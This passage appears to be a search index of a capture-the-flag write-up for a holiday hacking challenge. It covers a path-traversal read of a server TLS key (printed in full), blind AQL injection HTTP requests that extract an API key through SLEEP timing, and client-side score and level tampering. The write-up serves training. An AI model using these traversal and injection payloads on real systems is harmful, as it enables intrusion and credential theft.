URL-encoding it twice. We'll then use the path <code>/view/../&lt;encoded_nonce&gt;&lt;encoded_nonce&gt;/../../etc/nginx/certs/api.frostbit.app.key</code></p> <p>Hiding the nonce</p> <p>Luckily, our server seems to use Python's <code>os.path.realpath</code> function, so we can place our nonce anywhere inside it, and the path will be 'fixed' to our correct one.</p> <p>We still need to make sure the nonce lines up right. Unfortunately, the loop starts at \"count\", so it could start anywhere in the filename / nonce. Fortunately, the digest is only 16 characters long, we  we can simply bruteforce the URL by adding any character (eg <code>a</code>) in front of our nonces - it'll take us a maximum of 15 'a's until the nonces align. </p> <p>This gives us the following URL</p> <p></p>"},{"location":"objectives/act_3/o13_decrypt/#part-4-decrypt-all-the-things","title":"Part 4: Decrypt all the things!","text":"<p>As shown above, the debug data now includes a private key. Despite finding an open SSH port when scanning api.frostbit.app earlier, we cannot use it to SSH onto the website.</p> The private key <p>-----BEGIN RSA PRIVATE KEY----- MIIJKAIBAAKCAgEAplg5eKDvk9f gsWWZUtpFr80ojTZabm4Rty0Lorwtq5VJd37 8GgAmwxIFoddudP xMNz9u5lRFExqDWoK2TxKbyiGTOKV9IlpZULFyfV9//i8vq4 ew7H9Ts7duNh4geHNysfWqdrVebTRZ6AeCAeJ2cZuVP4briai0XDq2KUd/sc7kgQ xXGgw0t/FqiDglpSF1PFxPvUzJwcJNQhIYQCxRCwHkHqVSnToZcnjJjhgVyXsTNy 5pOLBWqg5nSnXrwl8JfGkUHN/Twbb829rIMT550ZxO8KYH4q/kV3cwVcSYfEYvMJ JoeQFCgHiuL5EuxAUbO6KZgTnRWhWQmotTQb fCj8siljg8dIdwxB690LvZYpvv4 yPLYgqCf9PzzgrZPvlJ XkInJ3s/ DOL0VbCgTHP0gbpO7kdjiTOBS1Jp FtbCG 6omvwSg/cELNnsDCs6F1x33iR7tumeQySwNPWNGt6pOHmyGfHYL2Rxhj5S5nCXqx GCx2q2mH8l4AL5bbzVVxEEa  Fgnd9r24SSC3bvlNVT0CDfBdoKzTuO8RONB4WKN kbqNj ME8JDHUA39ld/yqIViGjjAER/NTishk5zk0419AiQpHfOUnCNxq17NZP5K gLxx7xrTaLdPm0X9aMOcquIPenjrwZfIVpyqZoUn/D0zinoNInok8CFdbD8CAwEA AQKCAgAAgwz7PZuaqRsuafc9YblXyEqTphiCBGuIhuhul8hnJ2nb0ONKrDx9rk1E tIizkR8BIqqwonVoxtH9uLKUA0oermwLZFtTqye6CapTBoZ1bXcELlhz ARBnHyH DG/rLcM 3YSsxu0AlzN0rIGX5Lnj4jTGuFvlHntmGbLh9QqHJDzZKWmTACqUcTN0 8biM v4w5Rtq6PQot7vYVRcIBnJpTv2oqyOfRT8Frao9g213JA6xnI8CK9XJ83wx 56kGrinABUxaoKG6s33 XRHTursxKDxJPxzP6NJsgMtU/8kw0lAKghoLcofEfmfe oUAl7RYwOfdgUdVJFfws3vclPFxAUMNNiJW8Tl/IY6mZ5Pp1Gpi omBOyYfk9iyM S8R76afj3d0RhtT0Jii88yFtMBVFLSL8Y0sXEXEMdIXtox7fcb2TlZxXodYJeHJC 0dLQ3b7CB SPyDj3xZZHEFj4DRXwuCYKlXsaomXL7q9bqL8ljjJqc4WRWCe1 51e sFP9fUMzuc6lcbHczLhN5dgR cqriMo8LzrwpNia6DjGyBMfOyPLiN0Z7ZfXrXDv VSbBjrMqeMtC6SU10Cd2mVZLNJLjGnIwf/Sduo7VoNTg8F9GcaUrSqHKuB3dMU9c rvRHBxsDr4iszW4X0LCM6zSU84aES1kP/CNKg4zZXV2GvYMGFQKCAQEA5wFd YbE n02HTZo 8V0R/cK38NvEDAASKxEsREOTGybKw4B9oCL64sE8RYXOrbYo2MGLC7JL q08yLrEWCcWCObdDhMbTxYV J0rSGxiGjiOLGGoWwgKHS1FnrOBdL7bFBqayESji EqfVNk2VrmlhJKOMWwb2APGL8s4qdQkrHWwptpc UDJuJHdc6QCsHrHyafahfqwd aTHpyBRqIK69FmMSBPiSMLxE 1GI2yoy00Z55BEEJjQ1bTG1HdOkrNf5fBf 6WNA A3dc/2LaDk7Iotl5ZguhlwUQxZzxWhn2X23NVcQJGjJ4s0LwJyzPdi1CUlgA/UyQ r2UaD0nxYXl5ywKCAQEAuFfQ2pMd0M7C R7SmfN3765oqGKL 2FwkSgrhUW2aWzl 27SmyVSC0LloGDG6GorrhtLiqmfFGDW RBpG0aJITGOSbe3N0VH9pSu9buurnvJW DjijaNDKJnuihnuBH1VDsHCZROI6WvDFW1xyBPXo5nRVY6y5Or2eGTi/kbB/rEld EdvuA2CcwYOSnuffccQ8TRI RXLV1JDT3lWGKxRvyGuMUINzNk0nZN8X/Vw1SI4J dfZgWroizIZ9cu9RhYPdzqKW55TduKRRFDbSbQEecP8/HxUw0Zr3S3Z/dWA2vSmK o3OxmSIxnNlAkVZwrtoLr8qXggvN5dUdw/0BTrTY3QKCAQEAxDcqDpBFpRaibe0t t7CZXpWtzh2tyY p3wEIO7e2VWK 6g7TJllwB3mha2A77NuEmJDVPYslsQ5lDroG gShN9B5RcI  Q9GfFVr9WlybtlJEjOlYCVVCfFxaFsLBBI1Xj826BM9YMAZ1GVoP YQVLqWZuCse/349Mk2JBOAYgpC5CxEB1goNDgSAOQC/9A1mdEhqWlFU36immbPfC KZ6jKEfgf25wJotUgLCB8b9HSqRbVriJcLX6B5UoRXyHLPWKibiMIsvWDNuvl5Hs rCiJTaIx9ta8W93GoEQt0Z2p4ucOeeI45RKn6YRbHrt2QOgypGTx jW10/WpjAD/ 0g7vvwKCAQB1VV/YX9 QcqpjSp0d5HwokMiItQEIZkLyAbGByJeMjwXXTCsE5sfE 9t4s2CnujxHO5RflAtvOxxZt3pPJBxQhmxcu5TglzZw2r5qJqXO5XeIsdxx7sLma uQL/uki7mtfUzDaiQ6SFEc9skXD5e1RcqxtWsC/OFbc1sossvjzlemTE40mh2LKt 8YM3pbrxfMgs/jmolqlH/U79q04UyZNE7D JV8HThFRYvi9U0oYPwmh/Luyxktxn dgsPRwiKhR5/UbnfeT PMPdyeFqDizzHC5AvxpsmLw7Md4Y1PaJZ0MEvvIoEQGF3 xkh0uaJLiPn7UGYTHlRVv8qMXtOgNzf5AoIBADMC2X5FBjyxv/yTAROg8Dn90Kth p2PqLDVGeHDL2v0xcyvIthIve3/xGZgtBghfSyMPcqZ5s8h15m /QNNd95zl7xqF 5DJPoP66w /wM W4m/voMQM1kbQSnDqttLzG4TAXrjqklvx0QQAJAkC5X9L39WuE uHrkL2DOOn32tcSzic8SHMcZCg6VS/VIXi9C70Xq4pwa5RuFAtV9vBo90vD2m F yIHlLUXkLRxFZPPQZNwsACD8YoRPW/w60n2z7BzA5PcIZKNJlZqa9ixBunIxZXII jd6fDxOeVjU6usKzSeosoQCkEFvhlkVH6EK6Xfh6XDFatAnZyDNVP/PPihI= -----END RSA PRIVATE KEY-----</p> <p>We can use Cyberchef  to decrypt the encrypted key we found in the coredump earlier.  This also returns our nonce, so that we can confirm the private key is correct. This gives us the private key <code>9969eec849f936b6bd45f9cfb269b266</code></p> <p>Next, we can use the private key with our nonce as IV in Cyberchef to decrypt the naughty nice list. Note that both the key and IV are UTF-8 not hex, and the input is not encoded.</p> <p>This finally gives our answer:</p> <p>Xena Xtreme</p> <p>who is also last on our list and was naughty.</p>"},{"location":"objectives/act_3/o14_deactivate/","title":"Deactivate Frostbit Naughty-Nice List Publication","text":"<p>Official Difficulty: </p> <p>My Difficulty Rating: </p>"},{"location":"objectives/act_3/o14_deactivate/#objective","title":"Objective","text":"<p>Request</p> <p>Wombley's ransomware server is threatening to publish the Naughty-Nice list. Find a way to deactivate the publication of the Naughty-Nice list by the ransomware server.</p> Tangle Coalbox <p>Ah, there ya are, Gumshoe! Tangle Coalbox at yer service. Heard the news, eh? The elves\u2019 civil war took a turn for the worse, and now, things\u2019ve really gone sideways. Someone\u2019s gone and ransomware\u2019d the Naughty-Nice List! And just when you think it can't get worse\u2014turns out, it was none other than ol\u2019 Wombley Cube. He used Frostbit ransomware, all right. But, in true Wombley fashion, he managed to lose the encryption keys! That\u2019s right, the list is locked up tight, and it\u2019s nearly the start of the holiday season. Not ideal, huh? We're up a frozen creek without a paddle, and Santa\u2019s big day is comin\u2019 fast. The whole North Pole\u2019s stuck in a frosty mess, unless\u2014there\u2019s someone out there with the know-how to break us out of this pickle. If I know Wombley\u2014and I reckon I do\u2014he didn't quite grasp the intricacies of Frostbit\u2019s encryption. That gives us a sliver o' hope. If you can crack into that code, reverse-engineer it, we just might have a shot at pullin\u2019 these holidays outta the ice. It\u2019s no small feat, mind ya, but somethin\u2019 tells me you've got the brains to make it happen, Gumshoe. So, no pressure, but if we don\u2019t get this solved, the holidays could be in a real bind. I'm countin\u2019 on ya! And when ya do crack it, I reckon Santa\u2019ll make sure you're on the extra nice list this year. What d\u2019ya say?</p>"},{"location":"objectives/act_3/o14_deactivate/#hints","title":"Hints","text":"Frostbit Publication <p>There must be a way to deactivate the ransomware server's data publication. Perhaps one of the other North Pole assets revealed something that could help us find the deactivation path. If so, we might be able to trick the Frostbit infrastructure into revealing more details.</p> Frostbit Slumber <p>The Frostbit author may have mitigated the use of certain characters, verbs, and simple authentication bypasses, leaving us blind in this case. Therefore, we might need to trick the application into responding differently based on our input and measure its response. If we know the underlying technology used for data storage, we can replicate it locally using Docker containers, allowing us to develop and test techniques and payloads with greater insight into how the application functions.</p> (my own): Portswigger Academy <p>This challenge uses an uncommon technology so there's not much useful information online about attacks. If you're not familiar with SQL, it can be  helpful to learn about it for inspiration</p>"},{"location":"objectives/act_3/o14_deactivate/#solution","title":"Solution","text":"<p>Partial Solution</p> <p>I completed this challenge after decrypt. It's not necessary to solve them in this order, but this solution assumes the first part of decrypt is completed in order to get us from a zip folder to a URL.</p>"},{"location":"objectives/act_3/o14_deactivate/#determine-the-vulnerability","title":"Determine the vulnerability","text":"<p>In the Santa Vision challenge, when subscribed to the frostbitfeed MQTT feed, we saw the following  message:</p> MQTT feed <p>Error msg: Unauthorized access attempt. /api/v1/frostbitadmin/bot//deactivate, authHeader: X-API-Key, status: Invalid Key, alert: Warning, recipient: Wombley <p>Given that we have a botuuid from the decrypt challenge, and we also want to deactivate, this is  probably the path we want to use.</p> <p>We already have the website from the Decrypt challenge, so what happens if we just try the path: https://api.frostbit.app/api/v1/frostbitadmin/bot/e550ccc8-c8cf-4a58-ab68-3b527e14179d/deactivate</p> <p>A simple \"invalid request\" response isn't very helpful, so we should see if there's a debug option like there was for the status path: https://api.frostbit.app/api/v1/frostbitadmin/bot/e550ccc8-c8cf-4a58-ab68-3b527e14179d/deactivate?debug=1</p> <p>\"Invalid Key\" is a bit more useful. The MQTT error talked about <code>X-API-Key</code>, so it's probably referring to that, and <code>X-</code> are normally headers, so from here on out, we'll use Burp Suite to make our requests. Initially, I hoped this would be simple and just use the encryption key that we extracted in the last objective, so I tried sending that but still just got the \"Invalid Key\" response.</p> <p>Given the Slumber hint makes me think of a blind SQL injection, let's start with the classic SQL test:</p> <p><pre><code>GET /api/v1/frostbitadmin/bot/e550ccc8-c8cf-4a58-ab68-3b527e14179d/deactivate?debug=1 HTTP/2\nHost: api.frostbit.app\nAccept-Encoding: gzip, deflate, br\nX-Api-Key: '\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n</code></pre> Response: <pre><code>HTTP/2 403 Forbidden\nServer: nginx/1.27.1\nDate: Sun, 29 Dec 2024 04:03:26 GMT\nContent-Type: application/json\nContent-Length: 186\nStrict-Transport-Security: max-age=31536000\n\n{\"debug\":true,\"error\":\"Timeout or error in query:\\nFOR doc IN config\\n  FILTER doc.&lt;key_name_omitted&gt; == '{user_supplied_x_api_key}'\\n  &lt;other_query_lines_omitted&gt;\\n   RETURN doc\"}\n</code></pre></p> <p>Welp, that's definitely not SQL. Trying to Google the error message was not particularly helpful, simply returning a bunch of Python links (and \"FILTER\" means it's probably not Python!). Fortunately, the Bing AI chat was a bit more helpful and pointed me to the ArrangoDB and AQL.</p> <p>There doesn't appear to be anyway to change the AQL message, so (as per the hint), we'll have to brute force the values as a blind attack. Fortunately, AQL also has a SLEEP function, which seems to work:</p> <pre><code>GET /api/v1/frostbitadmin/bot/e550ccc8-c8cf-4a58-ab68-3b527e14179d/deactivate?debug=1 HTTP/2\nHost: api.frostbit.app\nAccept-Encoding: gzip, deflate, br\nX-Api-Key: '+SLEEP(5)+'\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n</code></pre> <p>URL encoding</p> <p>In the above request, I have URL-encoded the spaces because I assumed this would be necessary. I'm not too sure why I thought that, but it's not needed and meant I took far longer to get my next request working.</p> <p>So now that we know SLEEP works, we need to move it into an <code>OR</code> clause so that it will only run if our guess is wrong. We also need to figure out what we're trying to guess.</p>"},{"location":"objectives/act_3/o14_deactivate/#make-a-plan","title":"Make a plan","text":"<p>Presumably, we need the <code>&lt;key_name_omitted&gt;</code> value so that we can then dump that, and then finally dump the value and use it to deactivate the ransomware. In order to guess the key_name, we need to:</p> <ol> <li>get the doc keys. For that, we can use the ATTRIBUTES function.</li> <li>convert the array of attributes into a string. The NTH function seems like it can do that.</li> <li>get a single character of the string. SUBSTRING seems the key here.</li> </ol> <p>We can then start guessing the first letter of the first attribute using Burp's intruder tool by setting the X-API-Key to <code>'OR SUBSTRING(NTH(ATTRIBUTES(doc), 0), 0, 1) == '' OR SLEEP(5) AND 'a'=='a</code>. This means the full query running will be: <pre><code>FOR doc IN config\nFILTER doc.&lt;key_name_omitted&gt; == '' OR SUBSTRING(NTH(ATTRIBUTES(doc), 0), 0, 1) == '' OR SLEEP(5) and 'a'=='a'\n...\nRETURN doc\n</code></pre></p> <p>If the first letter of the first attribute in the document is '', the OR clause will short-circuit and return true before the SLEEP part. Otherwise it will SLEEP.</p> <p>Why doesn't the query just work if it returns true?</p> <p>I assume part of the redacted query part is checking that only one <code>doc</code> is returned, or is timing out if more than one is returned. Unfortunately we don't seem to be able to just use  <code>LIMIT</code> or subqueries to resolve this, since so many functions are blocked.</p>"},{"location":"objectives/act_3/o14_deactivate/#execute-the-plan","title":"Execute the plan","text":"<p>Using Burpsuite's intruder with the sniper mode, we can run the following request with a simple character payload (abcdefghijklmnopqrstuvwxyz0123456789-_) <pre><code>GET /api/v1/frostbitadmin/bot/e550ccc8-c8cf-4a58-ab68-3b527e14179d/deactivate?debug=1 HTTP/2\nHost: api.frostbit.app\nAccept-Encoding: gzip, deflate, br\nX-Api-Key: ' OR SUBSTRING(NTH(ATTRIBUTES(doc), 0), 0, 2) == 'd$$' OR SLEEP(5) AND 'a'=='a\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\n</code></pre></p> <p>Speeding up the Sleep</p> <p>Making 38 requests when consecutively is pretty slow if they're all sleeping 5 seconds. If you're smarter than I was, you'll realise this and experiment to see that SLEEP(1) is enough before you begin the iteration.</p> <p>Each time we find a letter (as noted by the faster response time and the smaller response body), we add it to our current string, and increment the <code>SUBSTRING(..., 2)</code>. Eventually, this shows us the attribute name: <code>deactivate_api_key</code></p> <p>That's probably the right attribute, so we don't need to start iterating through others (fortunately - sleep is slow, even if you're smart enough to minimise it!)</p> <p>We can take the same approach to get the value of the key as above, but adapting our string to be <code>' OR SUBSTRING(doc.deactivate_api_key, 0, 1) == '' OR SLEEP(1) AND 'a'='a</code></p> <p>Gotta go fast</p> <p>Since this is likely to be a UUID, it'll be faster if we rearrange our character set so that <code>-</code> and our numbers are checked before our letters. I haven't actually tested how much of a difference it makes, but it feels faster to me, and I'm too lazy to set BurpSuite up to be red.</p> <pre><code>GET /api/v1/frostbitadmin/bot/e550ccc8-c8cf-4a58-ab68-3b527e14179d/deactivate?debug=1 HTTP/2\nHost: api.frostbit.app\nAccept-Encoding: gzip, deflate, br\nX-Api-Key: ' OR SUBSTRING(doc.deactivate_api_key, 0, 2) == 'a' OR SLEEP(1) AND 'a'=='a\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n</code></pre> <p>This eventually gives us the key which we can send in the X-API-Key header:</p> <p><pre><code>GET /api/v1/frostbitadmin/bot/e550ccc8-c8cf-4a58-ab68-3b527e14179d/deactivate?debug=1 HTTP/2\nHost: api.frostbit.app\nAccept-Encoding: gzip, deflate, br\nX-Api-Key: abe7a6ad-715e-4e6a-901b-c9279a964f91\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n</code></pre> Response: <pre><code>HTTP/2 200 OK\nServer: nginx/1.27.1\nDate: Tue, 31 Dec 2024 04:36:14 GMT\nContent-Type: application/json\nContent-Length: 314\nStrict-Transport-Security: max-age=31536000\n\n{\"message\":\"Response status code: 200, Response body: {\\\"result\\\":\\\"success\\\",\\\"rid\\\":\\\"e550ccc8-c8cf-4a58-ab68-3b527e14179d\\\",\\\"hash\\\":\\\"7f28073866327e959cd340cdbe483ffb4b098c726c4e4ed77b9f7c2dc21199f2\\\",\\\"uid\\\":\\\"14720\\\"}\\nPOSTED WIN RESULTS FOR RID e550ccc8-c8cf-4a58-ab68-3b527e14179d\",\"status\":\"Deactivated\"}\n</code></pre></p>"},{"location":"objectives/act_3/o14_deactivate/#response","title":"Response","text":"<p>Tangle Coalbox</p> <p>Well, I\u2019ll be a reindeer\u2019s uncle! You've done it, Gumshoe! You cracked that frosty code and saved the Naughty-Nice List just in the nick of time. The elves\u2019ll be singin\u2019 your praises from here to the South Pole! I knew you had it in ya. Now, let\u2019s get these toys delivered and make this a holiday to remember. You're a true North Pole hero!</p>"},{"location":"objectives/prologue/o1_elf_connect/","title":"Elf Connect","text":"<p>Difficulty: </p>"},{"location":"objectives/prologue/o1_elf_connect/#objective","title":"Objective","text":"<p>Request</p> <p>Help Angel Candysalt connect the dots in a game of connections.</p> Angel Candysalt <p>Welcome back, island adventurer! I'm Angel Candysalt \u2014 so happy to finally meet you!</p> <p>I'm thrilled you're here because I could really use a hand with something.</p> <p>Have you ever heard of a game called Connections?</p> <p>It\u2019s simple! All you need to do is find groups of four related words.</p> <p>I've been stuck on it all day, and I'm sure someone as sharp as you will breeze through it.</p> <p>Oh, and while you're at it, check out randomElf's score \u2014 they hit fifty thousand points, which seems\u2026 oddly suspicious.</p> <p>Think they might have tampered with the game? Just a hunch!</p>"},{"location":"objectives/prologue/o1_elf_connect/#hints","title":"Hints","text":"Elf Connect Easy <p>I love brain games! This one is like the New York Times Connections game. Your goal here is to find groups of items that share something in common. Think of each group as having a hidden connection or theme\u2014four items belong together, and there are multiple groups to find! See if you can spot patterns or common threads to make connections. Group all the items correctly to win!</p> Elf Connect Hard <p>WOW! A high score of 50,000 points! That\u2019s way beyond the limit! With only four rounds and a max of 400 points per round, the top possible score should be 1,600 points. So, how did someone get to 50,000? Something unusual must be happening!</p> <p>If you're curious, you might want to check under the hood. Try opening the browser's developer tools console and looking around\u2014there might even be a variable named 'score' that could give you some insights. Sometimes, games hold secrets for those who dig a little deeper. Give it a shot and see what you can discover!</p>"},{"location":"objectives/prologue/o1_elf_connect/#solution","title":"Solution","text":""},{"location":"objectives/prologue/o1_elf_connect/#bronze-silver","title":"Bronze / Silver","text":"<p>For bronze, we can presumably just solve the challenges like you would if this was a normal game of Connections. I say \"presumably\" though, since I don't know enough Christmas-related things to get through the first round!</p> <p>Instead, we can look in the source code to find the answers:</p> <pre><code>const wordSets = {\n            1: [\"Tinsel\", \"Sleigh\", \"Belafonte\", \"Bag\", \"Comet\", \"Garland\", \"Jingle Bells\", \"Mittens\", \"Vixen\", \"Gifts\", \"Star\", \"Crosby\", \"White Christmas\", \"Prancer\", \"Lights\", \"Blitzen\"],\n            2: [\"Nmap\", \"burp\", \"Frida\", \"OWASP Zap\", \"Metasploit\", \"netcat\", \"Cycript\", \"Nikto\", \"Cobalt Strike\", \"wfuzz\", \"Wireshark\", \"AppMon\", \"apktool\", \"HAVOC\", \"Nessus\", \"Empire\"],\n            3: [\"AES\", \"WEP\", \"Symmetric\", \"WPA2\", \"Caesar\", \"RSA\", \"Asymmetric\", \"TKIP\", \"One-time Pad\", \"LEAP\", \"Blowfish\", \"hash\", \"hybrid\", \"Ottendorf\", \"3DES\", \"Scytale\"],\n            4: [\"IGMP\", \"TLS\", \"Ethernet\", \"SSL\", \"HTTP\", \"IPX\", \"PPP\", \"IPSec\", \"FTP\", \"SSH\", \"IP\", \"IEEE 802.11\", \"ARP\", \"SMTP\", \"ICMP\", \"DNS\"]\n        };\n...\n        let correctSets = [\n            [0, 5, 10, 14], // Set 1\n            [1, 3, 7, 9],   // Set 2\n            [2, 6, 11, 12], // Set 3\n            [4, 8, 13, 15]  // Set 4\n        ];\n</code></pre> <p>That gives us the following answers:</p> Round Group Connection One Tinsel, Garland,  Star, Lights Hung on a Christmas tree One Sleigh, Bag, Mittens, Gifts Christmas items? One Belafonte, Jingle Bells, Crosby, White Christmas Christmas Songs One Comet, Vixen, Prancer, Blitzen Reindeer Two Nmap, netcat, wireshark, nessus internet protocol-based tools? Two burp, owasp zap, nikto, wfuzz web fuzzers Two frida, cycript, appmon, apktool mobile app RE tools Two metasploit, cobalt strike, havoc, empire full exploit chain tools? Three Aes, rsa, blowfish, 3des hashing protocols Three wep, wpa2, tkip, leap LAN protocols Three symmetric, asymmetric, hash, hybrid encryption types Three caesar, one-time-pad, ottendorf, scytale cypher tools Four IGMP, IPX, IP, ICMP Internet-Protocols Four TLS, SSL, IPSec, SSH Security protocols Four Ethernet, PPP, IEEE 802.11, ARP LAN protocols Four HTTP, FTP, SMTP, DNS Application protocols"},{"location":"objectives/prologue/o1_elf_connect/#gold","title":"Gold","text":"<p>For gold, we need to get a score over 50,000. To do so, we can simply notice this line in the JavaScript code: <code>let score = parseInt(sessionStorage.getItem('score') || '0'); // Initialize score</code> and update the 'score' either in the JavaScript (and then complete a round) or in our session storage.</p> <p></p>"},{"location":"objectives/prologue/o1_elf_connect/#response","title":"Response","text":"<p>Angel Candysalt</p> <p>Amazing! You really connected all the dots like a pro.</p> <p>And guess what? You bumped randomElf off the leaderboard!</p> <p>Now, how about trying the game again \u2014 this time without any tampering or hacking.</p>"},{"location":"objectives/prologue/o2_elf_minder/","title":"Elf Minder","text":"<p>Difficulty:  Direct link: Objective 1 terminal</p>"},{"location":"objectives/prologue/o2_elf_minder/#objective","title":"Objective","text":"<p>Request</p> <p>Assist Poinsettia McMittens with playing a game of Elf Minder 9000.</p> Poinsetta McMittens <p>Center your mind, and become one with the island!</p> <p>Relax...</p> <p>This isn't working! I'm trying to play this game but the whole \"moving back to the North Pole\" thing completely threw me off.</p> <p>Say, how about you give it a try. It's really simple. All you need to do is help the elf get to the exit.</p> <p>The faster you get there, the better your score!</p> <p>I've run into some weirdness with the springs though. If I had created this game it would've been a lot more stable, but I won't comment on that any further.</p> <p>The rest of these elves are like corporate zombos. They just run around in circles unless you give them some direction.</p>"},{"location":"objectives/prologue/o2_elf_minder/#hints","title":"Hints","text":"RTD (Read the Docs) <p>Be sure you read the \"Help\" section thoroughly! In doing so, you will learn how to use the tools necessary to safely guide your elf and collect all the crates.</p> Reusable Paths <p>Some levels will require you to click and rotate paths in order for your elf to collect all the crates.</p> TODO <p>When developing a video game\u2014even a simple one\u2014it's surprisingly easy to overlook an edge case in the game logic, which can lead to unexpected behavior.</p>"},{"location":"objectives/prologue/o2_elf_minder/#solution","title":"Solution","text":"<p>For bronze, you can simply solve the game (and it's pretty fun, so why not). The last level, however, isn't possible to complete manually.</p> <p></p> <p>For gold, we have to open the developer tools and look at the JavaScript that's running. A couple of  things stand out: <pre><code>if (isEditor) {\n    adminControls.classList.remove('hidden');\n    console.log('\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1');\n    console.log('\u26a1 Hey, I noticed you are in edit mode! Awesome!');\n    console.log('\u26a1 Use the tools to create your own level.');\n    console.log('\u26a1 Level data is saved to a variable called `game.entities`.');\n    console.log('\u26a1 I\\'d love to check out your level--');\n    console.log('\u26a1 Email `JSON.stringify(game.entities)` to evan@counterhack.com');\n    console.log('\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1\u26a1');\n}\n</code></pre></p> <p>While interesting (and hopefully well used), editor mode doesn't help us win gold. <pre><code> localStorage.setItem(`level_${levelNum}`, JSON.stringify({\n            segments: game.segments,\n            entities: game.entities.filter(entity =&gt; ~[EntityTypes.SPRING, EntityTypes.PORTAL].indexOf(entity[2])),\n        }));\n\n        if (game.hasStartSegments()) {\n            startBtn.classList.add('ready');\n        }  else {\n            startBtn.classList.remove('ready');\n        }\n</code></pre> suggests we might want to look in the local storage. Everything is stored in plaintext without any validation so we can simply update the level <code>level_A Real Pickle</code>:</p> <pre><code>{\"segments\":[[[10,9], [11,9]],[[1,1],[2,1]],[[2,1],[3,1]],[[7,1],[8,1]],[[8,1],[9,1]],[[9,1],[9,2]],[[9,2],[9,3]],[[9,3],[8,3]],[[6,3],[5,3]],[[5,3],[5,4]],[[5,4],[5,5]],[[5,5],[4,5]],[[4,5],[3,5]],[[3,5],[3,6]],[[3,6],[3,7]],[[3,7],[4,7]],[[4,7],[5,7]],[[5,7],[6,7]],[[6,7],[7,7]],[[7,7],[8,7]],[[8,7],[9,7]],[[9,7],[10,7]]],\"entities\":[[3,1,6],[7,1,6],[8,3,7],[10,7,7],[9,7,7]]}\n</code></pre>"},{"location":"objectives/prologue/o2_elf_minder/#response","title":"Response","text":"<p>Poinsetta McMittens</p> <p>Way to pass them some of your super centered energy. Better you than me, though. I'd let them walk themselves straight off the island.</p> <p>You took the easy win, it seems we're kindred spirits. But there's also a hard way to solve this challenge.</p> <p>The more segments you use, the higher the reward. But who actually wants life to be more difficult?</p>"}]}